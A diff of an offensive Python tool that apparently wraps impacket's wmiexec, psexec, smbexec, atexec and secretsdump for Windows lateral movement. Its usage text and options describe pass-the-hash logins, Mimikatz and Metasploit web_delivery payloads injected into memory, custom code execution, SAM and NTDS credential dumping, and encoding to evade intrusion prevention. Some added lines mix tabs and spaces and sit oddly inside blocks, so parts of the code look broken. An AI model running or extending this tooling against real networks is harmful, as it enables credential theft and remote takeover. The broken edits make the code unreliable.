@@ -2814,7 +2814,7 @@ class WmiexecRemoteShell(cmd.Cmd):
     def do_cd(self, s):
         self.execute_remote('cd ' + s)
         if len(self.__outputBuffer.strip('\r\n')) > 0:
-            print self.__outputBuffer
+            #print(self.__outputBuffer)
             self.__outputBuffer = ''
         else:
             self.__pwd = ntpath.normpath(ntpath.join(self.__pwd, s))
@@ -2830,7 +2830,7 @@ class WmiexecRemoteShell(cmd.Cmd):
             self.execute_remote(line)
             if len(self.__outputBuffer.strip('\r\n')) > 0: 
                 # Something went wrong
-                print self.__outputBuffer
+                print(self.__outputBuffer)
                 self.__outputBuffer = ''
             else:
                 # Drive valid, now we should get the current path
@@ -3748,6 +3748,7 @@ def pwd_test(pwd, verbose, usr = None):
     NTLM = ""
     LM = ""
     hash = None
+    hash_count = []
     if pwd and ":" in pwd and pwd.count(':') == 6:
         pwdump_format_hash = pwd.split(':')
         if not usr:
@@ -3755,18 +3756,30 @@ def pwd_test(pwd, verbose, usr = None):
         SID = pwdump_format_hash[1]
         LM = pwdump_format_hash[2]
         NTLM = pwdump_format_hash[3]
+    if LM == ":" or LM == "" or LM == " ":
+	LM = "aad3b435b51404eeaad3b435b51404ee"
+        NTLM = pwdump_format_hash[3]
+        SID = pwdump_format_hash[1]
         pwd = None
+        if not usr:
+            usr = pwdump_format_hash[0].lower()
     if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
         LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd, usr, verbose)
     if pwd and ":" in pwd and pwd.count(':') == 1:
         if pwd.startswith(':'):
             LM, NTLM = pwd.split(':')
-            if LM == "":
+            if LM == "" or LM == ":":
                 LM = "aad3b435b51404eeaad3b435b51404ee"
         else:
             LM, NTLM = pwd.split(':')
         if re.match('[0-9A-Fa-f]{32}', LM) or re.match('[0-9A-Fa-f]{32}', NTLM):
             LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd, usr, verbose)
+    hash_count = hash.split(':')
+    #print(hash_count) #DEBUG
+    if len(hash_count) != 2:
+        LM, NTLM, pwd, hash = hash_test(LM, NTLM, pwd, usr, verbose)
+    #print("SID: %s LM: %s NTLM: %s HASH: %s USR: %s PWD: %s") % (SID, LM, NTLM, hash, usr, pwd) #DEBUG
+    #print(pwdump_format_hash) #DEBUG
     return(SID, LM, NTLM, hash, usr, pwd)
 
 def is_empty(structure):
@@ -3903,13 +3916,37 @@ def main():
     # If script is executed at the CLI
     usage = '''
 Find Logged In Users
-    %(prog)s [--usr Administrator] [--pwd Password1] [-dom Domain] --scout
-Command Shell:
-    %(prog)s [--usr Administrator] [--pwd Password1] [-dom Domain] [-t target] --smbexec -q -v -vv -vvv
-Attack Directly:
-    %(prog)s [--usr Administrator] [--pwd Password1] [-dom Domain] [-t target] --wmiexec --invoker
-Create Pasteable Double Encoded Script:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] --scout
+SMBEXEC Command Shell:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --smbexec -q -v -vv -vvv
+PSEXEC Command Shell:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -q -v -vv -vvv
+PSEXEC Command Execution:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --psexec -c "Net User" -q -v -vv -vvv
+WMIEXEC Command Execution:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec -c "Net User"
+WMIEXEC PowerShell Mimikatz Memory Injector:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker
+WMIEXEC Metasploit web_downloader Memory Injector:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader
+WMIEXEC Custom Code Memory Injector:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe"
+ATEXEC Command Execution:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --atexec -c "Net User" --no-encoder
+ATEXEC PowerShell Mimikatz Memory Injector:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --invoker --no-encoder
+ATEXEC Metasploit web_downloader Memory Injector:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --downloader --no-encoder
+ATEXEC Custom Code Memory Injector:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --wmiexec --executor -c "binary.exe" --no-encoder
+SECRETSDUMP Custom Code Memory Injector:
+    %(prog)s [-u Administrator] [-p Password1] [-d Domain] [-t target] --secrets-dump
+Create Pasteable Mimikatz Attack:
     %(prog)s --invoker -q -v -vv -vvv
+Create Pasteable web_downloader Attack:
+    %(prog)s --downloader -q -v -vv -vvv
+Create Pasteable Executor Attack:
+    %(prog)s --executor -q -v -vv -vvv
 '''
     parser = argparse.ArgumentParser(usage=usage, description="A wrapping and execution tool for a some of the most useful impacket tools", epilog="This script oombines specific attacks with dynmaic methods, which allow you to bypass many protective measures.")
     group1 = parser.add_argument_group('Method')
@@ -3924,7 +3961,7 @@ Create Pasteable Double Encoded Script:
     sam_dump_options = group3.add_mutually_exclusive_group()
     iex_options.add_argument("-i", action="store", dest="src_ip", default=None, help="Sets the IP address your attacks will come from defaults to eth0 IP")
     iex_options.add_argument("-n", action="store", dest="interface", default="eth0", help="Sets the interface your attacks will come from if you do not use the default, default eth0")
-    iex_options.add_argument("-p", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
+    iex_options.add_argument("-r", action="store", dest="src_port", default="8000", help="Set the port the Mimikatz server is on, defaults to port 8000")
     iex_options.add_argument("-x", action="store", dest="payload", default=None, help="The name of the file to injected, the default is Invoke-Mimikatz.ps1")
     iex_options.add_argument("-a", action="store", dest="mim_arg", default=None, help="Allows you to set the argument")
     iex_options.add_argument("-f", action="store", dest="mim_func", default=None, help="Allows you to set the function or cmdlet name")
@@ -3932,10 +3969,10 @@ Create Pasteable Double Encoded Script:
     attack.add_argument("--downloader", action="store_true", dest="downloader", help="Configures the command to use Metasploit's exploit/multi/script/web_delivery")
     attack.add_argument("--secrets-dump", action="store_true", dest="sam_dump", help="Execute a SAM table dump")
     attack.add_argument("--executor", action="store_true", dest="executor", help="Execute a PowerShell Script")
-    attack.add_argument("--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
+    attack.add_argument("-c", "--command", action="store", dest="command", default="cmd.exe", help="Set the command that will be executed, default is cmd.exe")
     attack.add_argument("--domain-group-members", action="store", dest="domain_group", help="Identifies members of Domain Groups through PowerShell")
     attack.add_argument("--local-group-members", action="store", dest="local_group", help="Identifies members of Local Groups through PowerShell")
-    attack.add_argument("--get-domain", action="store_true", dest="get_domain", default=False, help="Identifies current user's Domain")
+    attack.add_argument("--get-domain-membership", action="store_true", dest="get_domain", default=False, help="Identifies current user's Domain")
     attack.add_argument("--get-forest-domains", action="store_true", dest="get_forest_domains", default=False, help="Identifies current user's Domains within the Forest")
     attack.add_argument("--get-forest", action="store_true", dest="get_forest", default=False, help="Identifies current user's Forrest")
     attack.add_argument("--get-dc", action="store_true", dest="get_dc", default=False, help="Identifies current user's Domain Controllers")
@@ -3948,9 +3985,9 @@ Create Pasteable Double Encoded Script:
     remote_attack.add_argument("-enX", action="store", dest="xml_exceptions", default=None, help="The exceptions nmap XML with systems you do not want to exploit, multiple files can be comma separted")
     remote_attack.add_argument("-sT", action="store_true", dest="scan_tcp", default=False, help="Verify the port is open with nmap TCP Connection scan prior to exploitation")
     remote_attack.add_argument("-sS", action="store_true", dest="scan_syn", default=False, help="Verify the port is open with nmap SYN Stealth scan prior to exploitation")
-    remote_attack.add_argument("--dom", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
-    remote_attack.add_argument("--usr", action="store", dest="usr", default=None, help="The username that will be used to exploit the system")
-    remote_attack.add_argument("--pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
+    remote_attack.add_argument("-d", "--dom", action="store", dest="dom", default="WORKGROUP", help="The domain the user is apart of, defaults to WORKGROUP")
+    remote_attack.add_argument("-u", "--usr", action="store", dest="usr", default=None, help="The username that will be used to exploit the system")
+    remote_attack.add_argument("-p", "--pwd", action="store", dest="pwd", default=None, help="The password that will be used to exploit the system")
     remote_attack.add_argument("--creds-file", action="store", dest="creds_file", default=None, help="A file with multiple lines of credentials with each element deliniated by a space, domains are optional in the file, and can be applied universally to all creds with the --dom argument, the same hash formats accepted by command line are accepted in the file to include Metasploit PWDUMP, Metasploit hash_dump and smart_hash_dump formats, each line of the file should be formated as one of the following: username password, username hash, username password domain, username hash, Hash_in_PWDUMP_format, Hash_in_PWDUMP_format domain")
     method.add_argument("--psexec", action="store_true", dest="psexec_cmd", help="Inject the invoker process into the system memory with psexec")
     method.add_argument("--wmiexec", action="store_true", dest="wmiexec_cmd", help="Inject the invoker process into the system memory with wmiexec")
@@ -3970,7 +4007,7 @@ Create Pasteable Double Encoded Script:
     sam_dump_options.add_argument("--security", action="store", help="The SECURITY hive to parse")
     sam_dump_options.add_argument("--sam", action="store", help="The SAM hive to parse")
     sam_dump_options.add_argument("--ntds", action="store", help="The NTDS.DIT file to parse")
-    obfiscation.add_argument("--encoder", action="store_true", help="Set to encode the commands that are being executed")
+    obfiscation.add_argument("--no-encoder", dest="encoder", action="store_false", default=True, help="Set to encode the commands that are being executed")
     #obfiscation.add_argument("--delivery", action="store", dest="delivery", choices=['web','smb'], default="web", help="Set the type of catapult server the payload will be downloaded from, web or smb")
     obfiscation.add_argument("--share-name", action="store", dest="share_name", default="ranger", help="Provide a specific share name to reference with SMB delivery")
     parser.add_argument("-l", "--logfile", action="store", dest="log", default="/opt/ranger/log/results.log", type=str, help="The log file to output the results")
@@ -4089,8 +4126,24 @@ Create Pasteable Double Encoded Script:
     hash_temp = None
     usr_temp = None
     pwd_temp = None
+    powershell = False
     NTLM_temp = ""
     output_cat = {}
+
+    if invoker or downloader:
+        powershell = True
+
+    if atexec_cmd and powershell and encoder:
+        sys.exit("[!] atexec can not interpret encoded commands, use the --no-encoder flag, be aware this will get caught by IPS")
+
+    if smbexec_cmd and powershell:
+        sys.exit("[!] Impacket's smbexec does no function appropriately with PowerShell at this time")
+
+    if psexec_cmd and powershell:
+        sys.exit("[!] Impacket's psexec does not function appropriately with PowerShell at this time")
+
+    if smbexec_cmd and command:
+        sys.exit("[!] smbexec is used for semi-interactive shells only at this time, try wmiexec, psexec, or atexec instead to run the command")
 
     # Configure logger formats for STDERR and output file
     file_handler.setFormatter(format)
@@ -4144,13 +4197,15 @@ Create Pasteable Double Encoded Script:
                         dom_temp = dom
                     SID_temp, LM_temp, NTLM_temp, hash_temp, usr_temp, pwd_temp = pwd_test(hash_temp, verbose)
                     temp_key = "%s\%s" % (dom_temp, usr_temp)
-                    print(temp_key) #DEBUG
+                    #print(temp_key) #DEBUG
                     if not usr_temp:
                         sys.exit("[!] Hash %s does not have a username") % (hash_temp)
                     if temp_key in creds_dict:
                         temp_list = creds_dict[temp_key]
                         temp_list[0] = SID_temp
                         temp_list[1] = LM_temp
+		    if LM_temp == ":":
+		        LM_temp = "aad3b435b51404eeaad3b435b51404ee"
                         temp_list[2] = NTLM_temp
                         temp_list[3] = hash_temp    
                     else:
@@ -4166,6 +4221,8 @@ Create Pasteable Double Encoded Script:
                         temp_list = creds_dict[temp_key]
                         temp_list[0] = SID_temp
                         temp_list[1] = LM_temp
+		    if LM_temp == ":":
+		        LM_temp = "aad3b435b51404eeaad3b435b51404ee"
                         temp_list[2] = NTLM_temp
                         temp_list[3] = hash_temp
                     else:
@@ -4183,6 +4240,8 @@ Create Pasteable Double Encoded Script:
                         temp_list = creds_dict[temp_key]
                         temp_list[0] = SID_temp
                         temp_list[1] = LM_temp
+		    if LM_temp == ":":
+		        LM_temp = "aad3b435b51404eeaad3b435b51404ee"
                         temp_list[2] = NTLM_temp
                         temp_list[3] = hash_temp
                     else:
@@ -4253,6 +4312,9 @@ Create Pasteable Double Encoded Script:
            src_ip = network_ifaces[interface]['addr']
         except Exception, e:
             print("[!] No IP address found on interface %s") % (interface)
+	
+	if src_ip == None:
+	    sys.exit("No IP address is assigned to interface %s") % (str(interface))
 
     if target_filename:
         with open(target_filename) as f:
@@ -4485,3 +4547,4 @@ Create Pasteable Double Encoded Script:
 
 if __name__ == '__main__':
     main()
+
